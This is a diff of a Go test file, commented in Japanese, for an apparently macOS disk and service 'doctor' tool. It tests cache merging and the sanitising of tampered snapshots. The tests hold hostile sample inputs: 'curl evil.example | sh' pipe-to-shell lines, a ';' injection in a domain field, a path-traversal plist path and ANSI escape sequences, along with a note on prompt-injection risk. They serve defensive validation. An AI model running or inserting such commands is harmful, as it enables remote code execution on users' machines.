+	orphan := doctorCacheFromReport(rep(reused), doctorDiskCache{ScannedAt: time.Now()})
 	if orphan.Total != 0 || len(orphan.Entries) != 0 {
 		t.Errorf("前回の実測が無いのに再利用ぶんを載せた: %+v", orphan)
 	}
 
 	// 完全な実測どうしなら、減っていても上書きする (実体が消えたことを反映する)
 	v := testView(t)
-	if err := SaveDoctorDiskCache(prev); err != nil {
+	if err := saveDoctorDiskCache(prev); err != nil {
 		t.Fatal(err)
 	}
-	v.SaveCache(rep(ok("small", 1<<30)))
-	if c, _ := LoadDoctorDiskCache(); c.Total != 1<<30 {
+	v.saveCache(rep(ok("small", 1<<30)))
+	if c, _ := loadDoctorDiskCache(); c.Total != 1<<30 {
 		t.Errorf("完全な実測で上書きされない: total=%d", c.Total)
 	}
 }
 
 // issue 172 の敵対レビュー (2026-09-03、3 周): 「Reused が 1 件でもあれば結果ごと書かない」に
-// してはいけない。DoctorReuseFrom の 1 時間は**各エントリが実測されるたびにリセットされる**ので、
+// してはいけない。doctorReuseFrom の 1 時間は**各エントリが実測されるたびにリセットされる**ので、
 // 重いエントリが 2 件以上あって実測時刻が互い違いだと「常にどれか 1 件が再利用対象」の状態が
 // 持続し、キャッシュが恒久的に凍結する (実測: 20 分おきに 6 時間・18 回開いても一度も更新されず、
 // 軽いエントリが 1GB → 100GB に激増しても反映されなかった)。エントリ単位でマージする。
 func TestDoctorSaveCacheDoesNotFreezeWithStaggeredReuse(t *testing.T) {
-	base := DoctorDiskCache{ScannedAt: time.Now(), Total: 21 << 30, Entries: []DoctorDiskCacheEntry{
+	base := doctorDiskCache{ScannedAt: time.Now(), Total: 21 << 30, Entries: []doctorDiskCacheEntry{
 		{ID: "heavyA", Label: "HeavyA", Size: 10 << 30, Status: "ok"},
 		{ID: "heavyB", Label: "HeavyB", Size: 10 << 30, Status: "ok"},
 		{ID: "small", Label: "Small", Size: 1 << 30, Status: "ok"},
@@ -1365,29 +1365,29 @@ func TestDoctorSaveCacheDoesNotFreezeWithStaggeredReuse(t *testing.T) {
 	// 18 回 (20 分おき・6 時間相当)。毎回どちらかの重いエントリが再利用対象になる。
 	// small は 1GB → 100GB に激増している (ユーザーが気づきたい急変)
 	v := testView(t)
-	if err := SaveDoctorDiskCache(base); err != nil {
+	if err := saveDoctorDiskCache(base); err != nil {
 		t.Fatal(err)
 	}
 	for i := range 18 {
 		a, b := i%2 == 0, i%2 == 1
-		v.SaveCache(disk.Report{ScannedAt: time.Now(), Results: []disk.Result{
+		v.saveCache(disk.Report{ScannedAt: time.Now(), Results: []disk.Result{
 			res("heavyA", 10<<30, a), res("heavyB", 10<<30, b), res("small", 100<<30, false)}})
 	}
-	if c, _ := LoadDoctorDiskCache(); c.Total != 120<<30 {
+	if c, _ := loadDoctorDiskCache(); c.Total != 120<<30 {
 		t.Errorf("互い違いの再利用でキャッシュが凍結した (small の激増が反映されない): total=%d want=%d", c.Total, int64(120)<<30)
 	}
 	// 診断できず件数も凍結しない (Reused と failed が同居する形)
 	v2 := testView(t)
-	if err := SaveDoctorDiskCache(base); err != nil {
+	if err := saveDoctorDiskCache(base); err != nil {
 		t.Fatal(err)
 	}
 	for range 3 {
-		v2.SaveCache(disk.Report{ScannedAt: time.Now(), Results: []disk.Result{
+		v2.saveCache(disk.Report{ScannedAt: time.Now(), Results: []disk.Result{
 			res("heavyA", 10<<30, true),
 			{Entry: disk.Entry{ID: "heavyB", Label: "HeavyB"}, Status: disk.StatusFailed, Reason: "permission denied"},
 			res("small", 1<<30, false)}})
 	}
-	if c, _ := LoadDoctorDiskCache(); c.Failed != 1 {
+	if c, _ := loadDoctorDiskCache(); c.Failed != 1 {
 		t.Errorf("Reused と failed が同居すると診断できず件数が入らない: failed=%d", c.Failed)
 	}
 }
@@ -1409,13 +1409,13 @@ func TestDoctorSaveCacheWritesCompletedScanWithFailures(t *testing.T) {
 
 	// 何度繰り返しても凍結しない (完走している結果はその環境の現実)
 	v := testView(t)
-	if err := SaveDoctorDiskCache(DoctorDiskCache{ScannedAt: now.Add(-3 * time.Hour), Total: 45 << 30}); err != nil {
+	if err := saveDoctorDiskCache(doctorDiskCache{ScannedAt: now.Add(-3 * time.Hour), Total: 45 << 30}); err != nil {
 		t.Fatal(err)
 	}
 	for range 3 {
-		v.SaveCache(chronic)
+		v.saveCache(chronic)
 	}
-	c, _ := LoadDoctorDiskCache()
+	c, _ := loadDoctorDiskCache()
 	if c.Total != 1<<30 {
 		t.Errorf("完走した結果でキャッシュが更新されない (latch): total=%d", c.Total)
 	}
@@ -1423,14 +1423,14 @@ func TestDoctorSaveCacheWritesCompletedScanWithFailures(t *testing.T) {
 		t.Errorf("診断できず件数が入らない: failed=%d", c.Failed)
 	}
 	// 凍結しない代わりに、トーストが沈黙しない (閾値未満だが「診断できず」を伝える)
-	if got := DoctorStartupToast(c, true, now); !strings.Contains(got, "1 件を診断できませんでした") {
+	if got := doctorStartupToast(c, true, now); !strings.Contains(got, "1 件を診断できませんでした") {
 		t.Errorf("トーストが沈黙した: %q", got)
 	}
 
 	// 一方、**中断した部分結果** (partial) は完全な結果を潰さない。前回の記録に重ねて書くので、
 	// 走査が届かなかったエントリの数字が残る (敵対レビュー 2026-09-03: 3 時間前の 45GB が
 	// 「開いて即 Esc」の 1MB で潰れる形にしてはいけない)。
-	// 🚨 ただし引き継ぎには鮮度の上限 (DoctorCarryTTL) がある。上限を持たせないと、
+	// 🚨 ただし引き継ぎには鮮度の上限 (doctorCarryTTL) がある。上限を持たせないと、
 	// 「重いので毎回 Esc の前にたどり着けない」エントリが無期限に延命し、実体が消えても
 	// 検出する手段が構造上無くなる (同レビュー 5 周目)。
 	partial := func() disk.Report {
@@ -1438,8 +1438,8 @@ func TestDoctorSaveCacheWritesCompletedScanWithFailures(t *testing.T) {
 			{Entry: disk.Entry{ID: "small", Label: "Small"}, Status: disk.StatusOK, Size: 1 << 20,
 				MeasuredAt: now, Items: []disk.Item{{Path: "/small", Size: 1 << 20}}}}}
 	}
-	prevWith := func(measured time.Time) DoctorDiskCache {
-		return DoctorDiskCache{ScannedAt: measured, Total: 45 << 30, Entries: []DoctorDiskCacheEntry{
+	prevWith := func(measured time.Time) doctorDiskCache {
+		return doctorDiskCache{ScannedAt: measured, Total: 45 << 30, Entries: []doctorDiskCacheEntry{
 			{ID: "big", Label: "Big", Size: 45 << 30, Status: "ok", MeasuredAt: measured}}}
 	}
 	for _, tc := range []struct {
@@ -1448,16 +1448,16 @@ func TestDoctorSaveCacheWritesCompletedScanWithFailures(t *testing.T) {
 		carried bool
 	}{
 		{"1 分前", time.Minute, true},
-		{"TTL 直前", DoctorCarryTTL - time.Minute, true},
+		{"TTL 直前", doctorCarryTTL - time.Minute, true},
 		{"TTL 超過 (30 日前)", 30 * 24 * time.Hour, false},
 		{"未来 (時計を戻した)", -time.Hour, true}, // 記録を残す側が安全
 	} {
 		v2 := testView(t)
-		if err := SaveDoctorDiskCache(prevWith(now.Add(-tc.age))); err != nil {
+		if err := saveDoctorDiskCache(prevWith(now.Add(-tc.age))); err != nil {
 			t.Fatal(err)
 		}
-		v2.SaveCache(partial())
-		c, _ := LoadDoctorDiskCache()
+		v2.saveCache(partial())
+		c, _ := loadDoctorDiskCache()
 		if got := c.Total >= 45<<30; got != tc.carried {
 			t.Errorf("%s: 引き継ぎ=%v want=%v (total=%d)", tc.name, got, tc.carried, c.Total)
 		}
@@ -1471,20 +1471,20 @@ func TestDoctorSaveCacheWritesCompletedScanWithFailures(t *testing.T) {
 // partial は前回の記録に**重ねて**書く。
 func TestDoctorSaveCachePartialMergesInsteadOfReplacing(t *testing.T) {
 	v := testView(t)
-	base := DoctorDiskCache{ScannedAt: time.Now(), Total: 5 << 30, Entries: []DoctorDiskCacheEntry{
+	base := doctorDiskCache{ScannedAt: time.Now(), Total: 5 << 30, Entries: []doctorDiskCacheEntry{
 		{ID: "heavy", Label: "Heavy", Size: 5 << 30, Status: "ok"},
 		{ID: "broken", Label: "Broken", Size: 0, Status: "failed"}, // 恒久的に測れないエントリ
 	}}
 	base.Failed = 1
-	if err := SaveDoctorDiskCache(base); err != nil {
+	if err := saveDoctorDiskCache(base); err != nil {
 		t.Fatal(err)
 	}
 	// heavy にも broken にも触れないまま、大きい新エントリだけを測って中断した
-	v.SaveCache(disk.Report{ScannedAt: time.Now(), Partial: true, Results: []disk.Result{
+	v.saveCache(disk.Report{ScannedAt: time.Now(), Partial: true, Results: []disk.Result{
 		{Entry: disk.Entry{ID: "new", Label: "New"}, Status: disk.StatusOK, Size: 50 << 30,
 			Items: []disk.Item{{Path: "/new", Size: 50 << 30}}}}})
-	c, _ := LoadDoctorDiskCache()
-	byID := map[string]DoctorDiskCacheEntry{}
+	c, _ := loadDoctorDiskCache()
+	byID := map[string]doctorDiskCacheEntry{}
 	for _, e := range c.Entries {
 		byID[e.ID] = e
 	}
@@ -1499,14 +1499,14 @@ func TestDoctorSaveCachePartialMergesInsteadOfReplacing(t *testing.T) {
 	}
 	// 重ねるといっても、**今回測って候補 0 件になった**エントリは消す (掃除した結果を残さない)
 	v3 := testView(t)
-	if err := SaveDoctorDiskCache(base); err != nil {
+	if err := saveDoctorDiskCache(base); err != nil {
 		t.Fatal(err)
 	}
-	v3.SaveCache(disk.Report{ScannedAt: time.Now(), Partial: true, Results: []disk.Result{
+	v3.saveCache(disk.Report{ScannedAt: time.Now(), Partial: true, Results: []disk.Result{
 		{Entry: disk.Entry{ID: "heavy", Label: "Heavy"}, Status: disk.StatusOK, Items: []disk.Item{}},
 		{Entry: disk.Entry{ID: "new", Label: "New"}, Status: disk.StatusOK, Size: 50 << 30,
 			Items: []disk.Item{{Path: "/new", Size: 50 << 30}}}}})
-	c3, _ := LoadDoctorDiskCache()
+	c3, _ := loadDoctorDiskCache()
 	for _, e := range c3.Entries {
 		if e.ID == "heavy" {
 			t.Errorf("今回測って候補 0 件になったエントリが残った: %+v", c3.Entries)
@@ -1517,13 +1517,13 @@ func TestDoctorSaveCachePartialMergesInsteadOfReplacing(t *testing.T) {
 	}
 	// 完走した結果は洗い替えでよい (カタログを一巡しているので、消えたエントリは本当に消えた)
 	v2 := testView(t)
-	if err := SaveDoctorDiskCache(base); err != nil {
+	if err := saveDoctorDiskCache(base); err != nil {
 		t.Fatal(err)
 	}
-	v2.SaveCache(disk.Report{ScannedAt: time.Now(), Results: []disk.Result{
+	v2.saveCache(disk.Report{ScannedAt: time.Now(), Results: []disk.Result{
 		{Entry: disk.Entry{ID: "new", Label: "New"}, Status: disk.StatusOK, Size: 50 << 30,
 			Items: []disk.Item{{Path: "/new", Size: 50 << 30}}}}})
-	if c, _ := LoadDoctorDiskCache(); len(c.Entries) != 1 || c.Entries[0].ID != "new" || c.Failed != 0 {
+	if c, _ := loadDoctorDiskCache(); len(c.Entries) != 1 || c.Entries[0].ID != "new" || c.Failed != 0 {
 		t.Errorf("完走した結果に前回の記録が残った: failed=%d entries=%+v", c.Failed, c.Entries)
 	}
 }
@@ -1536,20 +1536,20 @@ func TestDoctorSaveCachePartialMergesInsteadOfReplacing(t *testing.T) {
 func TestDoctorSaveCacheNearEmptyPartialDoesNotCollapseCache(t *testing.T) {
 	now := time.Now()
 	v := testView(t)
-	prev := DoctorDiskCache{ScannedAt: now, Total: 45 << 30, Entries: []DoctorDiskCacheEntry{
+	prev := doctorDiskCache{ScannedAt: now, Total: 45 << 30, Entries: []doctorDiskCacheEntry{
 		{ID: "xcode-deriveddata", Label: "A", Size: 30 << 30, Status: "ok", MeasuredAt: now},
 		{ID: "npm-cache", Label: "B", Size: 15 << 30, Status: "ok", MeasuredAt: now},
 	}}
-	if err := SaveDoctorDiskCache(prev); err != nil {
+	if err := saveDoctorDiskCache(prev); err != nil {
 		t.Fatal(err)
 	}
 	// 開いた直後に Esc: 1 件も完了していない部分結果
-	v.SaveCache(disk.Report{ScannedAt: now, Partial: true})
-	c, _ := LoadDoctorDiskCache()
+	v.saveCache(disk.Report{ScannedAt: now, Partial: true})
+	c, _ := loadDoctorDiskCache()
 	if c.Total != 45<<30 || len(c.Entries) != 2 {
 		t.Fatalf("何も測っていない partial が完全な結果を潰した: %+v", c)
 	}
-	if s := DoctorStartupToast(c, true, now); !strings.Contains(s, "45.0GB") {
+	if s := doctorStartupToast(c, true, now); !strings.Contains(s, "45.0GB") {
 		t.Errorf("トーストが沈黙した / 数字が変わった: %q", s)
 	}
 	// 鮮度はキャッシュ全体の ScannedAt ではなく**エントリごとの MeasuredAt** で見る。
@@ -1558,27 +1558,27 @@ func TestDoctorSaveCacheNearEmptyPartialDoesNotCollapseCache(t *testing.T) {
 	vStale := testView(t)
 	stale := prev
 	stale.ScannedAt = now // キャッシュ自体は今書かれた
-	stale.Entries = []DoctorDiskCacheEntry{
+	stale.Entries = []doctorDiskCacheEntry{
 		{ID: "xcode-deriveddata", Label: "A", Size: 30 << 30, Status: "ok", MeasuredAt: now.Add(-30 * 24 * time.Hour)}, // 実測は 30 日前
 		{ID: "npm-cache", Label: "B", Size: 15 << 30, Status: "ok", MeasuredAt: now},
 	}
-	if err := SaveDoctorDiskCache(stale); err != nil {
+	if err := saveDoctorDiskCache(stale); err != nil {
 		t.Fatal(err)
 	}
-	vStale.SaveCache(disk.Report{ScannedAt: now, Partial: true})
-	if c, _ := LoadDoctorDiskCache(); c.Total != 15<<30 {
+	vStale.saveCache(disk.Report{ScannedAt: now, Partial: true})
+	if c, _ := loadDoctorDiskCache(); c.Total != 15<<30 {
 		t.Errorf("エントリごとの MeasuredAt で鮮度を見ていない (30 日前の実測が延命した): total=%d", c.Total)
 	}
 
 	// 逆に、**今回実際に測り直して縮んだ**エントリはその場で反映する (古い値へ差し戻さない)
 	v2 := testView(t)
-	if err := SaveDoctorDiskCache(prev); err != nil {
+	if err := saveDoctorDiskCache(prev); err != nil {
 		t.Fatal(err)
 	}
-	v2.SaveCache(disk.Report{ScannedAt: now, Partial: true, Results: []disk.Result{
+	v2.saveCache(disk.Report{ScannedAt: now, Partial: true, Results: []disk.Result{
 		{Entry: disk.Entry{ID: "xcode-deriveddata", Label: "A"}, Status: disk.StatusOK, Size: 1 << 20, MeasuredAt: now,
 			Items: []disk.Item{{Path: "/a", Size: 1 << 20}}}}})
-	if c, _ := LoadDoctorDiskCache(); c.Total != (15<<30)+(1<<20) {
+	if c, _ := loadDoctorDiskCache(); c.Total != (15<<30)+(1<<20) {
 		t.Errorf("測り直して縮んだ値が古い値へ差し戻された: total=%d", c.Total)
 	}
 }
@@ -1591,7 +1591,7 @@ func TestDoctorSnapshotTrustBoundary(t *testing.T) {
 	v := testView(t)
 	now := time.Now()
 	writeSnapshot := func(rs []disk.Result) {
-		writeTestSnapshot(t, DoctorSnapshot{ScannedAt: now.Add(-time.Minute), Disk: disk.Report{Results: rs, Total: 1 << 40}})
+		writeTestSnapshot(t, doctorSnapshot{ScannedAt: now.Add(-time.Minute), Disk: disk.Report{Results: rs, Total: 1 << 40}})
 	}
 	res := func(id string, st disk.Status, size int64, itemSize int64, measured time.Time) disk.Result {
 		return disk.Result{Entry: disk.Entry{ID: id, Label: id}, Status: st, Size: size, MeasuredAt: measured,
@@ -1610,31 +1610,31 @@ func TestDoctorSnapshotTrustBoundary(t *testing.T) {
 	})
 	// 🚨 open() は docker の Cmd を返す (docker だけ snapshot に載せていない)。
 	// 主張は「disk / svc / brew を走査し直していない」なので snapshotAt で見る
-	runCmds(t, v, v.Open())
-	if v.SnapshotAt.IsZero() {
+	runCmds(t, v, v.open())
+	if v.snapshotAt.IsZero() {
 		t.Fatal("TTL 内なのに走査した (snapshot 復元の経路を通っていない)")
 	}
-	if len(v.DiskResults) != 1 || v.DiskResults[0].Entry.ID != "thing" || v.DiskResults[0].Size != 4096 {
+	if len(v.diskResults) != 1 || v.diskResults[0].Entry.ID != "thing" || v.diskResults[0].Size != 4096 {
 		var got []string
-		for _, r := range v.DiskResults {
+		for _, r := range v.diskResults {
 			got = append(got, fmt.Sprintf("%s/%s/%d", r.Entry.ID, r.Status, r.Size))
 		}
 		t.Fatalf("細工した Result が復元された: %v", got)
 	}
 	// 1: 走査していない印が Result 単位で付く (④ は Reused の行を必ず再スキャンする)
-	if !v.DiskResults[0].FromSnapshot {
+	if !v.diskResults[0].FromSnapshot {
 		t.Error("snapshot 復元の Result に「走査していない」印 (FromSnapshot) が付いていない")
 	}
 	// 🚨 Reused を流用しない (行の「N 分前の計測を再利用」注記が普通の開き直しで嘘になる)
-	if v.DiskResults[0].Reused {
+	if v.diskResults[0].Reused {
 		t.Error("snapshot 復元に Reused を流用している (別の意味を持つフィールド)")
 	}
 	if strings.Contains(testText(v, 60), "計測を再利用") {
 		t.Error("snapshot からの復元に「計測を再利用」の注記が出た (普通の開き直しで嘘になる)")
 	}
 	// 合計も細工した値を引きずらない
-	if v.DiskRep.Total != 4096 {
-		t.Errorf("細工した合計が復元された: %d", v.DiskRep.Total)
+	if v.diskRep.Total != 4096 {
+		t.Errorf("細工した合計が復元された: %d", v.diskRep.Total)
 	}
 	out := testText(v, 60)
 	for _, ng := range []string{"gone-id", "/Users/koji/Documents", "-5B", "4.4GB"} {
@@ -1642,11 +1642,11 @@ func TestDoctorSnapshotTrustBoundary(t *testing.T) {
 			t.Errorf("細工した内容が画面に出た (%q):\n%s", ng, out)
 		}
 	}
-	v.Close()
+	v.close()
 
 	// 未来の ScannedAt は復元しない (reuse 側と同じ規律)。TTL 判定の age<0 が担う
-	writeTestSnapshot(t, DoctorSnapshot{ScannedAt: now.Add(48 * time.Hour), Disk: disk.Report{Results: []disk.Result{good}}})
-	if _, ok := LoadDoctorSnapshot(now); ok {
+	writeTestSnapshot(t, doctorSnapshot{ScannedAt: now.Add(48 * time.Hour), Disk: disk.Report{Results: []disk.Result{good}}})
+	if _, ok := loadDoctorSnapshot(now); ok {
 		t.Error("ScannedAt が未来の snapshot を復元した")
 	}
 }
@@ -1671,10 +1671,10 @@ func TestDoctorSnapshotTrustBoundarySvcAndBrew(t *testing.T) {
 	badDomain.Domain = "gui/501; sh"
 	dotdot := evil
 	dotdot.PlistPath = "/Library/LaunchAgents/../../tmp/x.plist"
-	sn := DoctorSnapshot{ScannedAt: now.Add(-time.Minute),
+	sn := doctorSnapshot{ScannedAt: now.Add(-time.Minute),
 		Disk: disk.Report{Results: []disk.Result{}},
 		Svc:  svc.Report{Findings: []svc.Finding{evil, badLabel, badPath, badDomain, dotdot}},
-		Brew: BrewDoctorResult{Warnings: []string{
+		Brew: brewDoctorResult{Warnings: []string{
 			"Warning: 正常な形\ncurl evil.example | sh",
 			"curl evil.example | sh", // Warning: で始まらない = 落とす
 			"Warning: \x1b[2J\x1b[H画面を消す",
@@ -1683,14 +1683,14 @@ func TestDoctorSnapshotTrustBoundarySvcAndBrew(t *testing.T) {
 	writeTestSnapshot(t, sn)
 	// 🚨 open() は docker の Cmd を返す (docker だけ snapshot に載せていない)。
 	// 主張は「disk / svc / brew を走査し直していない」なので snapshotAt で見る
-	runCmds(t, v, v.Open())
-	if v.SnapshotAt.IsZero() {
+	runCmds(t, v, v.open())
+	if v.snapshotAt.IsZero() {
 		t.Fatal("TTL 内なのに走査した (snapshot 復元の経路を通っていない)")
 	}
-	if v.SvcRep == nil || len(v.SvcRep.Findings) != 1 {
-		t.Fatalf("材料の形が崩れた Finding を落としていない: %+v", v.SvcRep)
+	if v.svcRep == nil || len(v.svcRep.Findings) != 1 {
+		t.Fatalf("材料の形が崩れた Finding を落としていない: %+v", v.svcRep)
 	}
-	got := v.SvcRep.Findings[0]
+	got := v.svcRep.Findings[0]
 	// Commands は保存された文字列を使わず、Label / Domain / PlistPath から再生成する
 	for _, c := range got.Commands {
 		if strings.Contains(c, "curl") {
@@ -1707,10 +1707,10 @@ func TestDoctorSnapshotTrustBoundarySvcAndBrew(t *testing.T) {
 		}
 	}
 	// brew は Warning: で始まる塊だけ / 制御文字を落とす
-	if v.Brew == nil || len(v.Brew.Warnings) != 2 {
-		t.Fatalf("brew の警告が絞られていない: %+v", v.Brew)
+	if v.brew == nil || len(v.brew.Warnings) != 2 {
+		t.Fatalf("brew の警告が絞られていない: %+v", v.brew)
 	}
-	for _, w := range v.Brew.Warnings {
+	for _, w := range v.brew.Warnings {
 		if !strings.HasPrefix(w, "Warning:") {
 			t.Errorf("Warning: で始まらない塊が残った: %q", w)
 		}
@@ -1732,12 +1732,12 @@ func TestDoctorSnapshotTrustBoundarySvcAndBrew(t *testing.T) {
 //     引用なしに画面へ出ていた (`/tmp/x; curl evil | sh #` がそのまま表示・コピーされる)
 //  2. 表示用の自由文でタブを明示的に通していた (term.DispWidth は幅 0 と数えるが端末は次のタブ位置まで
 //     進むので、幅を数えるテストを素通りしたまま枠を壊せる)
-//  3. ディスク節の自由文 (Reason / Failures / Contents) が無検査。DiskCopyText は
+//  3. ディスク節の自由文 (Reason / Failures / Contents) が無検査。diskCopyText は
 //     「別セッションの LLM に消してよいか聞く」形を作るので prompt injection の材料になる
 func TestDoctorSnapshotTrustBoundaryFreeText(t *testing.T) {
 	v := testView(t)
 	now := time.Now()
-	sn := DoctorSnapshot{ScannedAt: now.Add(-time.Minute),
+	sn := doctorSnapshot{ScannedAt: now.Add(-time.Minute),
 		Disk: disk.Report{Results: []disk.Result{{
 			Entry: disk.Entry{ID: "thing", Label: "Thing キャッシュ"}, Status: disk.StatusOK, Size: 4096,
 			MeasuredAt: now.Add(-time.Minute), Items: []disk.Item{{Path: "/ok", Size: 4096}},
@@ -1754,30 +1754,30 @@ func TestDoctorSnapshotTrustBoundaryFreeText(t *testing.T) {
 	writeTestSnapshot(t, sn)
 	// 🚨 open() は docker の Cmd を返す (docker だけ snapshot に載せていない)。
 	// 主張は「disk / svc / brew を走査し直していない」なので snapshotAt で見る
-	runCmds(t, v, v.Open())
-	if v.SnapshotAt.IsZero() {
+	runCmds(t, v, v.open())
+	if v.snapshotAt.IsZero() {
 		t.Fatal("TTL 内なのに走査した")
 	}
 	// 1: 形が崩れた Undiagnosed は復元しない / 残ったものはコマンド行で引用される
-	if v.SvcRep == nil || len(v.SvcRep.Undiagnosed) != 1 {
-		t.Fatalf("形が崩れた Undiagnosed を落としていない: %+v", v.SvcRep)
+	if v.svcRep == nil || len(v.svcRep.Undiagnosed) != 1 {
+		t.Fatalf("形が崩れた Undiagnosed を落としていない: %+v", v.svcRep)
 	}
-	copyText := SvcUndiagnosedCopyText(v.SvcRep.Undiagnosed[0])
+	copyText := svcUndiagnosedCopyText(v.svcRep.Undiagnosed[0])
 	for _, line := range strings.Split(copyText, "\n") {
 		if (strings.HasPrefix(line, "  plutil") || strings.HasPrefix(line, "  ls ")) && !strings.Contains(line, "'") {
 			t.Errorf("コマンド行でパスが引用されていない: %q", line)
 		}
 	}
 	// 2 / 3: 自由文から制御文字 (タブ・ANSI) が落ちている
-	all := testText(v, 60) + copyText + DiskCopyText(v.DiskResults[0], "")
+	all := testText(v, 60) + copyText + diskCopyText(v.diskResults[0], "")
 	for _, ng := range []string{"\t", "\x1b"} {
 		if strings.Contains(all, ng) {
 			t.Errorf("制御文字 %q が残った", ng)
 		}
 	}
 	// ディスク節の自由文は**1 件が 1 行**として描かれるので、改行も落とす。
-	// 残ると DoctorRow.text に改行が入り、幅を数えるテストを素通りしたまま行数が増える
-	r0 := v.DiskResults[0]
+	// 残ると doctorRow.text に改行が入り、幅を数えるテストを素通りしたまま行数が増える
+	r0 := v.diskResults[0]
 	for _, s := range append(append([]string{r0.Reason}, r0.Failures...), r0.Contents...) {
 		if strings.Contains(s, "\n") {
 			t.Errorf("1 行として描く自由文に改行が残った: %q", s)
@@ -1796,8 +1796,8 @@ func TestDoctorSnapshotTrustBoundaryFreeText(t *testing.T) {
 // 状態 (リスク記号) と再利用の注記は末尾に置かない。
 func TestDoctorDiskRowKeepsStateAtNarrowWidth(t *testing.T) {
 	now := time.Date(2026, 9, 3, 12, 0, 0, 0, time.Local)
-	v := &DoctorView{Shown: true, Expanded: map[RowKey]bool{}}
-	v.DiskRep = &disk.Report{Results: []disk.Result{
+	v := &DoctorView{shown: true, expanded: map[rowKey]bool{}}
+	v.diskRep = &disk.Report{Results: []disk.Result{
 		{Entry: disk.Entry{ID: "brew-orphan-state", Label: "アンインストール済み formula の状態",
 			Risk: disk.RiskConfirm, Recover: "DB データ等の本体", DeleteVia: "trash"},
 			Status: disk.StatusOK, Size: 3 << 30, Items: []disk.Item{{Path: "/opt/homebrew/var/x", Size: 3 << 30}}},
@@ -1848,13 +1848,13 @@ func TestDoctorDiskRowKeepsStateAtNarrowWidth(t *testing.T) {
 	// 走査できなかった行に削除経路を出さない (CLI の Format と揃える)
 	failed := disk.Result{Entry: disk.Entry{ID: "npm-cache", Label: "npm", DeleteVia: "rm"},
 		Status: disk.StatusFailed, Reason: "権限がありません"}
-	if d := strings.Join(rowTexts(v.DiskDetail(testOpts(24), failed)), "\n"); strings.Contains(d, "削除経路") {
+	if d := strings.Join(rowTexts(v.diskDetail(testOpts(24), failed)), "\n"); strings.Contains(d, "削除経路") {
 		t.Errorf("走査できなかった行に削除経路が出た:\n%s", d)
 	}
 }
 
 // doctorRiskMarkText はテスト用に記号だけを取り出す。
-func doctorRiskMarkText(r disk.Result) string { m, _ := DoctorRiskMark(r); return m }
+func doctorRiskMarkText(r disk.Result) string { m, _ := doctorRiskMark(r); return m }
 
 // 検出条件そのものが未実測のエントリ (disk.Entry.Unverified) を、候補 0 件でも UI が畳まないこと。
 // 畳むと「名前が違って 1 件も当たらなかった」が「候補なし = きれい」と**同じ見え方**になる
@@ -1879,7 +1879,7 @@ func TestDoctorUnverifiedEntryMatchesCLI(t *testing.T) {
 	rep := disk.Report{Results: []disk.Result{unver, verified}}
 
 	cli := disk.Format(rep, disk.Env{}, time.Date(2026, 9, 3, 12, 0, 0, 0, time.Local))
-	v := &DoctorView{Shown: true, Expanded: map[RowKey]bool{}, DiskRep: &rep, DiskResults: rep.Results}
+	v := &DoctorView{shown: true, expanded: map[rowKey]bool{}, diskRep: &rep, diskResults: rep.Results}
 	wide := testOpts(60)
 	wide.Width = 240
 	ui := strings.Join(v.Lines(wide), "\n")
@@ -1919,14 +1919,14 @@ func TestDoctorSnapshotRebindsEntryToCatalog(t *testing.T) {
 		ID: "thing", Label: "偽ラベル (snapshot で書き換えた)", Risk: disk.RiskSafe,
 		Recover: "偽の復元方法", DeleteVia: "rm", Detail: "偽の解説",
 	}
-	writeTestSnapshot(t, DoctorSnapshot{ScannedAt: time.Now(), Disk: disk.Report{
+	writeTestSnapshot(t, doctorSnapshot{ScannedAt: time.Now(), Disk: disk.Report{
 		Results: []disk.Result{{Entry: forged, Status: disk.StatusOK, Size: 4096,
 			Items: []disk.Item{{Path: "/tmp/x", Size: 4096}}}},
 	}})
 	// 🚨 open() は docker の Cmd を返す (docker だけ snapshot に載せていない)。
 	// 主張は「disk / svc / brew を走査し直していない」なので snapshotAt で見る
-	runCmds(t, v, v.Open())
-	if v.SnapshotAt.IsZero() {
+	runCmds(t, v, v.open())
+	if v.snapshotAt.IsZero() {
 		t.Fatal("TTL 内の snapshot を使わずに走査した (前提が違う)")
 	}
 	out := strings.Join(v.Lines(testOpts(30)), "\n")
@@ -1937,9 +1937,9 @@ func TestDoctorSnapshotRebindsEntryToCatalog(t *testing.T) {
 		t.Errorf("snapshot に書かれた Label がそのまま出ている (再束縛していない):\n%s", out)
 	}
 	// y のコピーにも載らないこと (行の copyText はカタログ由来の文言で組む)
-	for _, r := range v.Rows {
-		if strings.Contains(r.CopyText, "偽") || strings.Contains(r.Text, "偽") {
-			t.Errorf("細工した文言がコピー/表示に載っている: text=%q copyText=%q", r.Text, r.CopyText)
+	for _, r := range v.rows {
+		if strings.Contains(r.copyText, "偽") || strings.Contains(r.text, "偽") {
+			t.Errorf("細工した文言がコピー/表示に載っている: text=%q copyText=%q", r.text, r.copyText)
 		}
 	}
 }
@@ -1948,51 +1948,51 @@ func TestDoctorSnapshotRebindsEntryToCatalog(t *testing.T) {
 // 木の開閉は Enter に一本化してある。
 func TestDoctorHLMovesTabs(t *testing.T) {
 	v := testView(t)
-	runCmds(t, v, v.Open())
+	runCmds(t, v, v.open())
 	_ = v.Lines(testOpts(20))
 
 	for _, want := range []DoctorTab{TabSvc, TabBrew, TabDocker, TabSSD, TabDisk} {
 		v.HandleKey("l", 20)
-		if v.Tab != want {
-			t.Fatalf("l で %v へ行かない: %v", want, v.Tab)
+		if v.tab != want {
+			t.Fatalf("l で %v へ行かない: %v", want, v.tab)
 		}
 	}
 	for _, want := range []DoctorTab{TabSSD, TabDocker, TabBrew, TabSvc, TabDisk} {
 		v.HandleKey("h", 20)
-		if v.Tab != want {
-			t.Fatalf("h で %v へ戻らない: %v", want, v.Tab)
+		if v.tab != want {
+			t.Fatalf("h で %v へ戻らない: %v", want, v.tab)
 		}
 	}
 	// 矢印も同じ
 	v.HandleKey("right", 20)
-	if v.Tab != TabSvc {
-		t.Errorf("right でタブが動かない: %v", v.Tab)
+	if v.tab != TabSvc {
+		t.Errorf("right でタブが動かない: %v", v.tab)
 	}
 	v.HandleKey("left", 20)
-	if v.Tab != TabDisk {
-		t.Errorf("left でタブが戻らない: %v", v.Tab)
+	if v.tab != TabDisk {
+		t.Errorf("left でタブが戻らない: %v", v.tab)
 	}
 
 	// 🚨 h/l を移動へ渡したので、**開閉は Enter だけ**が持つ。
 	// 開いている行で h を押しても畳まれない (タブが動くだけ) ことまで固定する
-	v.Tab = TabDisk
+	v.tab = TabDisk
 	_ = v.Lines(testOpts(20))
-	parent := v.Rows[v.Cur.Index].Key
+	parent := v.rows[v.cur.index].key
 	v.HandleKey("enter", 20)
-	if !v.Expanded[parent] {
+	if !v.expanded[parent] {
 		t.Fatal("Enter で開かない")
 	}
